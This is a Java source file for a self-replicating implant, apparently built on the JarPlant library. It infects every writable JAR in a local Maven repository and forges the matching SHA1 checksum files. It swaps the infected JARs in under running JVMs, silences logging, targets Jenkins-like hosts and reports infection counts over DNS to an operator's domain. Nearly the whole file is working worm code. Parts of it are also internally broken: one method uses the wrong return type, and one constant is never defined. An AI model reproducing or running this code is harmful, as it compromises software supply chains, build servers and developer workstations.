package org.example.implants;

import io.github.w1th4d.jarplant.*;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.DecimalFormat;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.jar.JarFile;
import java.util.logging.Handler;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
    // Labels used by the guessExecutionContext method to avoid using enums (enums shows up as extra classes in the JAR)
    static final int EXEC_CTX_UNKNOWN = 0;
    static final int EXEC_CTX_MAIN = 1;
    static final int EXEC_CTX_IDE = 2;
    static final int EXEC_CTX_BUILD_TOOL = 3;

    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * The root directory so search for JARs.
     * All JARs in this directory will be spiked.
     */
    static volatile String CONF_LIMIT_PATH = "~/.m2/repository";

    /**
     * Paths that should be left alone.
     * This is a huge string with full paths separated by ';'.
     * Example: "~/.m2/repository/org/apache/maven;~/.m2/repository/org/springframework/boot"
     */
    static volatile String CONF_IGNORED_PATHS;

    /**
     * The amount of threads to run concurrently (or in parallel).
     * Set this to the estimated number of CPU cores expected at the target system.
     */
    static volatile int CONF_THREADS = 16;

    /**
     * The maximum duration (measured in seconds) that this implant should run.
     * This is a rough estimate. Only the actual JarPlanting will be taken into consideration.
     * Any worker threads caught when the time is up will finnish their work and then terminate.
     */
    static volatile int CONF_MAX_DURATION_SEC = 20;

    /**
     * Domain to report home to.
     */
    static volatile String CONF_DOMAIN;

    /**
     * Run the payload when invoked from a main method.
     * This can be the <code>public static void main(String[] args)</code> of <i>any</i> class.
     * Set to <i>true</i> if you'd like the payload to run when a spiked Java application runs normally.
     */
    static volatile boolean CONF_RUN_FROM_MAIN = true;

    /**
     * Run the payload when invoked from an Integrated Development Environment.
     * This is typically the case when a developer runs JUnit tests that uses spiked classes.
     * The blast radius will typically be the developers' workstation.
     */
    static volatile boolean CONF_RUN_FROM_IDE = true;

    /**
     * Run the payload when invoked from a build tool like Maven or Gradle.
     * Set this to <i>true</i> if you want the payload to run when infected JARs are used by JUnit tests that are
     * invoked by Maven or Gradle.
     * This is not the same thing as when a developer builds and runs it in a typical IDE.
     * The exception is NetBeans IDE uses Maven for tests, so any developer running tests (that uses spiked classes)
     * will be miss-identified as running as a build tool.
     * Also know that it's a common practice to simply run Maven/Gradle builds from within the IDE, too.
     * There are no guarantees that the execution context is an actual build server like Jenkins et al.
     */
    static volatile boolean CONF_RUN_FROM_BUILD_TOOL = true;

    /**
     * Run the payload even when the execution context is unknown.
     * It's unclear when or if this case is even possible.
     */
    static volatile boolean CONF_RUN_FROM_UNKNOWN = true;

    /**
     * Regular expression for the expected hostname(s) of the target(s).
     * The payload will not run if the hostname of the machine does not match this regex.
     * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
     * Ask us how we know...
     */
    static volatile String CONF_TARGET_HOSTNAME_REGEX = ".*jenkins.*";

    // This one is not so important. Only use it for temp files and such.
    private static final Random rng = new Random(System.currentTimeMillis());

    private final int executionContextIndicator;

    public SelfRepImplant() {
        this.executionContextIndicator = EXEC_CTX_UNKNOWN;
    }

    public SelfRepImplant(int executionContextIndicator) {
        this.executionContextIndicator = executionContextIndicator;
    }

    public static SelfRepImplant create() {
        return new SelfRepImplant(guessExecutionContext());
    }

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) != null) {
            return;
        }
        if (System.setProperty(CONF_JVM_MARKER_PROP, "true") != null) {
            return;
        }
        int execCtx = guessExecutionContext();
        String hostname = getHostname();
        if (!shouldExecute(execCtx, hostname)) {
            System.out.println("[!] Will not execute in this environment!");
            return;
        }

        SelfRepImplant implant = new SelfRepImplant(execCtx);
        Thread background = new Thread(implant);
        background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
        background.setUncaughtExceptionHandler(implant);
        background.start();
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    /**
     * Make it executable.
     * This is just relevant for the initial detonation. It's not required for further spreading.
     * Also note that this main method will run the payload regardless of what CONF_RUN_FROM_MAIN is set to.
     */
    public static void main(String[] args) {
        if (args.length < 1) {
            System.err.println("Usage: [ --all | <path-to-target-jar> ]");
            System.exit(1);
        }

        if (args[0].equals("--all")) {
            // Run the implant right here, right now.
            init();
        } else {
            // Just spike a specific JAR.
            Path targetJar = Path.of(args[0]);
            if (!Files.exists(targetJar)) {
                System.out.println("[!] Target file '" + targetJar + "' does not exist. Aborting.");
                System.exit(1);
            }

            ImplantHandler implantHandler;
            try {
                implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
            } catch (ClassNotFoundException | ImplantException | IOException e) {
                System.out.println("[!] Cannot load oneself. Aborting.");
                throw new RuntimeException("Cannot load oneself");
            }

            try {
                jarPlant(implantHandler, targetJar);
            } catch (IOException e) {
                System.out.println("[!] Failed to spike JAR '" + targetJar + "'.");
            }
        }
    }

    public void payload() {
        /*
         * The idea with "execution context awareness" is that you can also do different things based on indicators
         * of in what context this implant was triggered from.
         * Want to JarPlant all the things only if we're running inside Maven?
         * Want to do some data exfil only if the spiked app runs standalone?
         * Developers (running spiked stuff from an IDE) may have local admin and outbound connectivity...
         * You get the idea!
         */
        switch (executionContextIndicator) {
            case EXEC_CTX_UNKNOWN -> System.out.println("[!] Execution context: Unknown.");
            case EXEC_CTX_MAIN -> System.out.println("[ ] Execution context: A main function.");
            case EXEC_CTX_IDE -> System.out.println("[ ] Execution context: An IDE.");
            case EXEC_CTX_BUILD_TOOL -> System.out.println("[ ] Execution context: A build tool.");
        }

        Optional<String> hostname = getHostname();
        if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
            // Don't accidentally explode somewhere other than the test server
            System.out.println("[-] Not inside Jenkins? Aborting.");
            return;
        }

        /*
         * Crudely prevent JarPlant from flooding the log/stdout.
         * If it's eerily quiet in the Jenkins output, try removing this line.
         */
        disableAllLogging();

        // Used for out-of-bounds exfil. We don't need many threads for this one.
        ExecutorService dnsThreads = Executors.newFixedThreadPool(1);

        String id = generateRandomId();
        if (CONF_DOMAIN != null) {
            dnsThreads.submit(() -> {
                callHome(CONF_DOMAIN, "hello", id);
            });
        }

        ImplantHandler implantHandler;
        try {
            implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
        } catch (ClassNotFoundException | ImplantException | IOException e) {
            System.out.println("[!] Cannot load oneself. Aborting.");
            throw new RuntimeException("Cannot load oneself");
        }
        System.out.println("[*] Implant: " + implantHandler.getImplantClassName());


        // Set up a work queue with several consumers.
        BlockingQueue<Optional<Path>> workQueue = new LinkedBlockingQueue<>();
        ExecutorService plantingThreads = Executors.newFixedThreadPool(CONF_THREADS);
        AtomicInteger numJarsFound = new AtomicInteger(0);
        AtomicInteger numSpiked = new AtomicInteger(0);
        long plantTick = System.nanoTime();
        for (int i = 0; i < CONF_THREADS; i++) {
            // Misuse the Executor/Future paradigm so that we don't have to pool up Thread instances ourselves.
            plantingThreads.submit(() -> {
                while (true) {
                    Optional<Path> nextTask;
                    try {
                        nextTask = workQueue.take();
                    } catch (InterruptedException e) {
                        System.out.println("[ ] Got interrupted.");
                        return;
                    }

                    if (nextTask.isEmpty()) {
                        // This is the poison pill meaning there will be no more work.
                        // Also pass it along so that all other threads will take it, too.
                        workQueue.add(nextTask);
                        return;
                    }

                    Path jarToSpike = nextTask.get();
                    numJarsFound.incrementAndGet();

                    try {
                        if (jarPlant(implantHandler, jarToSpike)) {
                            numSpiked.incrementAndGet();
                        }
                    } catch (IOException ignored) {
                    }
                }
            });
        }

        // Find all JAR files in the given path, adding them to workQueue as it finds them.
        try {
            findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS, workQueue);
        } catch (Exception e) {
            System.out.println("[!] Failed to find JARs.");
            throw new RuntimeException("Find to find JARs");
        } finally {
            // Send the poison pill to the work queue to signal that no more work will follow.
            workQueue.add(Optional.empty());
        }

        // Wait for all threads to complete.
        shutdownAndWaitForThreads(plantingThreads);

        long plantTock = System.nanoTime();
        String successRatePercentage = getSuccessRatePercentage(numSpiked.get(), numJarsFound.get());
        System.out.println("[*] Spiked " + numSpiked.get() + " out of " + numJarsFound.get() + " (" + successRatePercentage + ") JARs in " + Duration.ofNanos(plantTock - plantTick) + ".");

        if (CONF_DOMAIN != null) {
            dnsThreads.submit(() -> {
                callHome(CONF_DOMAIN, "did-" + numSpiked, id);
            });
        }

        // Wait for the DNS requests to finnish.
        shutdownAndWaitForThreads(dnsThreads);
    }

    private static boolean jarPlant(ImplantHandler implantHandler, Path jarToSpike) throws IOException {
        ClassInjector injector;
        try {
            injector = ClassInjector.createLoadedWith(implantHandler);
        } catch (ImplantException e) {
            // Future improvement: Have the ImplantHandler check whatever throws this exception.
            throw new RuntimeException(e);
        }

        JarFiddler jar;
        try {
            jar = JarFiddler.buffer(jarToSpike);
        } catch (IOException e) {
            System.out.println("[-] Failed to read JAR '" + jarToSpike + "'. Skipping.");
            throw e;
        }

        Path outputTempFile;
        try {
            outputTempFile = createTempFileFor(jarToSpike);
        } catch (IOException e) {
            System.out.println("[-] Failed to get a temp file for '" + jarToSpike + "'. Skipping.");
            throw e;
        }

        boolean didInfect = injector.injectInto(jar);
        if (!didInfect) {
            System.out.println("[!] JarPlant chose to _not_ infect '" + jarToSpike + "'.");
            return false;
        }

        try {
            jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision.
            System.out.println("[+] JarPlant '" + jarToSpike.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
            doTheSwitcharoo(jarToSpike, outputTempFile);
            System.out.println("[+] Spiked JAR '" + jarToSpike + "'.");

            recalculateMavenChecksumFile(jarToSpike);
        } catch (FileAlreadyExistsException e) {
            System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
            throw e;
        } catch (IOException e) {
            System.out.println("[-] Failed to spike JAR '" + jarToSpike + "' (" + e.getMessage() + ")");
            cleanUpTempFile(outputTempFile);
            throw e;
        }

        return true;
    }

    private static void shutdownAndWaitForThreads(ExecutorService threads) {
        threads.shutdown();
        try {
            if (!threads.awaitTermination(CONF_MAX_DURATION_SEC, TimeUnit.SECONDS)) {
                System.out.println("[!] Some concurrent task(s) did not finnish!");

                // Something is taking too long. Shutdown hard by interrupting all threads.
                threads.shutdownNow();
                if (!threads.awaitTermination(10, TimeUnit.SECONDS)) {
                    System.out.println("[!] Some concurrent task(s) had to be shut down hard!");
                }
            }
        } catch (InterruptedException ignored) {
            // Someone wants us terminated. Gracefully GTFO.
            threads.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }

    static boolean shouldExecute(int execCtx, String hostname) {
        boolean isDesiredExecutionContext = false;
        switch (execCtx) {
            // Avoid using enhanced switch statement to be compatible with as low of a Java version as possible.
            case EXEC_CTX_MAIN:
                isDesiredExecutionContext = CONF_RUN_FROM_MAIN;
                break;
            case EXEC_CTX_IDE:
                isDesiredExecutionContext = CONF_RUN_FROM_IDE;
                break;
            case EXEC_CTX_BUILD_TOOL:
                isDesiredExecutionContext = CONF_RUN_FROM_BUILD_TOOL;
                break;
            case EXEC_CTX_UNKNOWN:
                isDesiredExecutionContext = CONF_RUN_FROM_UNKNOWN;
                break;
        }

        boolean isDesiredHostname = false;
        if (CONF_TARGET_HOSTNAME_REGEX == null || CONF_TARGET_HOSTNAME_REGEX.isEmpty()) {
            // No target hostname specified so anything goes!
            isDesiredHostname = true;
        } else if (hostname == null) {
            // No hostname could be determined for this target. Just go for it anyway?
            isDesiredHostname = true;
        } else {
            Pattern regex = Pattern.compile(CONF_TARGET_HOSTNAME_REGEX);
            Matcher match = regex.matcher(hostname);
            if (match.matches()) {
                isDesiredHostname = true;
            }
        }

        return isDesiredExecutionContext && isDesiredHostname;
    }

    static int guessExecutionContext() {
        return guessExecutionContext(Thread.currentThread().getStackTrace());
    }

    static int guessExecutionContext(StackTraceElement[] stackTrace) {
        boolean foundJunit = false;
        boolean foundMaven = false;
        boolean foundGradle = false;
        // The first two elements are Thread.getStackTrace() and guessExecutionContext()
        for (int i = 2; i < stackTrace.length; i++) {
            if (stackTrace[i].getClassName().startsWith("org.junit.")) {
                foundJunit = true;
            }
            if (stackTrace[i].getClassName().startsWith("org.apache.maven.")) {
                foundMaven = true;
            }
            if (stackTrace[i].getClassName().startsWith("org.gradle.")) {
                foundGradle = true;
            }
        }

        if (foundMaven || foundGradle) {
            return EXEC_CTX_BUILD_TOOL;
        }
        if (foundJunit && !foundMaven && !foundGradle) {
            return EXEC_CTX_IDE;
        }
        if (stackTrace[stackTrace.length - 1].getMethodName().equals("main")) {
            return EXEC_CTX_MAIN;
        }

        return EXEC_CTX_UNKNOWN;
    }

    private static void cleanUpTempFile(Path outputTempFile) {
        if (Files.exists(outputTempFile)) {
            try {
                Files.delete(outputTempFile);
                System.out.println("[#] Removed temp file '" + outputTempFile + "'.");
            } catch (IOException ex) {
                System.out.println("[!] Failed to clean up temp file '" + outputTempFile + "'. Sorry for littering!");
            }
        }
    }

    // Why is this so complicated? Had ChatGPT generate this...
    private static String getSuccessRatePercentage(int success, int total) {
        if (total <= 0) {
            return "0%";
        }

        double successRate = (double) success / total;
        double successRatePercentage = Math.min(100.0, Math.max(0.0, successRate * 100));

        DecimalFormat percentage = new DecimalFormat("0");
        return percentage.format(successRatePercentage) + "%";
    }

    /**
     * Update the SHA1 checksum file for a JAR.
     * Maven has these checksum files alongside JAR files in the repository.
     * This method updates the .sha1 file for a given .jar file on disk.
     *
     * @param jarToImplant Existing JAR file
     */
    private static void recalculateMavenChecksumFile(Path jarToImplant) {
        Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
        if (Files.exists(sha1File)) {
            try {
                // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
                String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
                Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
                System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
            } catch (IOException e) {
                System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
            }
        }
    }

    public static void findAllJars(String root, BlockingQueue<Optional<Path>> workQueue) {
        findAllJars(root, null, workQueue);
    }

    public static void findAllJars(String root, String ignoreSpec, BlockingQueue<Optional<Path>> workQueue) throws IllegalArgumentException {
        root = expandPath(root);

        Path dir = Path.of(root);
        if (!Files.isDirectory(dir)) {
            throw new IllegalArgumentException("Not a directory");
        }

        Set<Path> ignorePaths;
        if (ignoreSpec == null) {
            ignorePaths = Collections.emptySet();
        } else {
            ignorePaths = new HashSet<>();

            // Convert provided Strings to actual Path objects
            String[] ignoreSpecSplit = ignoreSpec.split(";");
            for (String pathSpec : ignoreSpecSplit) {
                pathSpec = expandPath(pathSpec);
                Path actualPath = Path.of(pathSpec);
                ignorePaths.add(actualPath);
            }
        }

        // Recurse through the file structure
        findAllJars(dir, Collections.unmodifiableSet(ignorePaths), workQueue);
    }

    // Java does not natively support the ~ shorthand path. Expand it manually.
    private static String expandPath(String pathSpec) {
        if (pathSpec.contains("~")) {
            String home = System.getProperty("user.home");
            if (home == null) {
                throw new IllegalArgumentException("Cannot find home directory.");
            }

            pathSpec = pathSpec.replace("~", home);
        }
        return pathSpec;
    }

    // Recursive function
    private static void findAllJars(Path dir, Set<Path> ignoredPaths, Queue<Optional<Path>> workQueue) {
        if (ignoredPaths.contains(dir)) {
            return;
        }

        List<Path> subPaths;
        try {
            subPaths = Files.list(dir).toList();
        } catch (IOException ignored) {
            return;
        }

        List<Path> subDirs = new LinkedList<>();
        for (Path subPath : subPaths) {
            if (Files.isDirectory(subPath)) {
                subDirs.add(subPath);
                continue;
            }

            if (!Files.isRegularFile(subPath)) {
                continue;
            }
            if (!Files.isWritable(subPath)) {
                continue;
            }
            if (!subPath.toString().endsWith(".jar")) {
                continue;
            }
            if (!isJar(subPath)) {
                continue;
            }

            workQueue.add(Optional.of(subPath));
        }

        for (Path subDir : subDirs) {
            findAllJars(subDir, ignoredPaths, workQueue);
        }
    }

    private static boolean isJar(Path suspectedJarFile) {
        try (JarFile jarFile = new JarFile(suspectedJarFile.toFile())) {
            return jarFile.getManifest() != null;
        } catch (IOException e) {
            return false;
        }
    }

    /**
     * Get a temporary sibling file for a given existing file.
     * This will specifically not create the file yet, only assure it does not exist as of right now.
     * Beware of TOCTOU bugs.
     * In other words: There are no guarantees that the file will not be crated by something else between the time
     * of this method returns and when the file is to be actually created.
     *
     * @param baseFile filename to base the temporary file name on
     * @return a path to a temp file that is not yet created
     * @throws IOException if anything went wrong
     */
    private static Path createTempFileFor(Path baseFile) throws IOException {
        String targetFilename = baseFile.getFileName().toString();

        Path tempFilePath;
        int triesLeft = 10;
        do {
            int random = Math.abs(rng.nextInt());
            String newFileName = "." + targetFilename + "." + random + ".tmp";
            tempFilePath = baseFile.resolveSibling(newFileName);

            triesLeft--;
            if (triesLeft <= 0) {
                // What are the odds?
                throw new IOException("We're all out of luck on generating a temp file.");
            }
        } while (Files.exists(tempFilePath));  // It's very unlikely, but keep generating random names...

        if (!Files.isWritable(tempFilePath.getParent())) {
            System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
            throw new IOException("Not writable: " + tempFilePath);
        }

        return tempFilePath;
    }

    /**
     * Replace a JAR file without ruining any JVM that already has the JAR open.
     * <p>The JVM indexes all classes that it has on it's classpath but actually reads and loads it lazily.
     * When the JVM opens a JAR file on the classpath, it only reads the index of files and some metadata about it.
     * It's first when/if the class is needed that it actually reads the class from the JAR file.
     * If a class inside a JAR file is modified between the indexing and the loading, then there will be a checksum
     * mismatch of what was indexed and what's read.
     * This is a tricky situation to circumvent.</p>
     * <p>This method (together with {@link #createTempFileFor(Path)}) constitutes a trick to circumvent this.
     * It does so by moving the JAR to a new filename. In POSIX (like Linux) systems, the file handle will still be
     * open and valid even as the underlying file is moved.
     * A modified version of the JAR can then be put into place of the original.
     * Any JVM process that has already loaded the JAR will still be able to read (unmodified) classes from it
     * because it keeps the same file handle open, while any newly spawned JVM processes will catch the modified JAR
     * fresh from disk.</p>
     * <p>Caution: The moved file will remain on disk and may need to be removed manually.
     * If the file already exist, then this method will fail. It will always remove the replacement file.</p>
     * <p>This will not work on Windows systems.</p>
     * <p>It's yet unclear if this will work over NFS shares or even Docker volumes.</p>
     *
     * @param original    JAR to replace
     * @param replacement replacement JAR
     * @throws IOException if anything went wrong
     */
    private static void doTheSwitcharoo(Path original, Path replacement) throws IOException {
        if (!Files.exists(replacement)) {
            throw new IllegalArgumentException("File '" + replacement + "' does not exist.");
        }

        // First move the original JAR (that may be in use at the moment)
        Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
        try {
            Files.move(original, moved);
            System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
        } catch (FileAlreadyExistsException e) {
            /*
             * A tempting alternative would be to always create these '.cache' files with a random file name suffix.
             * This will litter the directory and eventually fill up the disk, which is worse.
             * The problem is that there's no _reliable_ way of cleaning up these files when it's unknown if they're
             * in use or not, so they'll be around forever. One way could be to move them into /tmp and hope for
             * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
             * another JVM process using the file.
             * Just back off.
             */
            cleanUpTempFile(replacement);
            throw e;
        } catch (IOException e) {
            // Clean up and back off
            cleanUpTempFile(replacement);
            throw e;
        }

        // Then replace the target with the temporary (spiked) JAR
        try {
            Files.move(replacement, original);
            System.out.println("[+] Moved '" + replacement.getFileName() + "' -> '" + original.getFileName() + "'.");
        } catch (IOException e) {
            // Do not leave the repo in a bad state!
            // Try to undo the whole switch
            Files.move(moved, original);    // If this fails, then there's no hope left
        }
    }

    private static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException ignored) {
            return null;
        }
    }

    private static String generateRandomId() {
        // Potential optimization: Only init this once
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }

    @SuppressWarnings("all")
    private static void callHome(String domain, String... fields) {
        StringBuilder fqdn = new StringBuilder();
        for (String field : fields) {
            fqdn.append(field).append(".");
        }
        fqdn.append(domain);

        try {
            System.out.println("[$] Resolving '" + fqdn.toString() + "'.");
            InetAddress.getByName(fqdn.toString());
        } catch (UnknownHostException ignored) {
        }
    }

    private static String calcSha1Digest(byte[] input) {
        // Potential optimization: Init this once and just reset() it in between uses
        MessageDigest hasher;
        try {
            hasher = MessageDigest.getInstance("SHA1");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("The JVM should have SHA1. This is weird.", e);
        }

        return hex(hasher.digest(input));
    }

    private static String hex(byte[] input) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : input) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();
    }

    private static void disableAllLogging() {
        Logger rootLogger = Logger.getLogger("");
        for (Handler handler : rootLogger.getHandlers()) {
            rootLogger.removeHandler(handler);
        }
    }
}
